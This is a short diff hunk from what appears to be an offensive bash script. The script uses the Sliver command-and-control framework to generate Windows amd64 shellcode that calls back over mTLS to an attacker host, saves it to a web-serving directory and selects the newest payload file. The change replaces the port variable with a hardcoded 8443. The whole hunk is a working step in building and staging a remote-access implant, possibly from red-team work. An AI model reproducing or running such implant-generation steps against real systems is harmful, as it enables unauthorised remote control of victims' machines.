@@ -20,7 +20,7 @@ echo -e "\e[1;34m[*]=========================================\e[0m"
 # 1. GENERATE PAYLOAD
 echo -e "\e[1;33m[*] 1. Generating mTLS shellcode with Sliver...\e[0m"
 
-sliver-server generate -mtls "$LHOST:$LPORT" --os windows --arch amd64 --format shellcode --save "$WWW_DIR"
+sliver-server generate -mtls "$LHOST:8443" --os windows --arch amd64 --format shellcode --save "$WWW_DIR"
 
 LATEST_PAYLOAD=$(ls -t "$WWW_DIR"/*.bin 2>/dev/null | head -n 1)
 
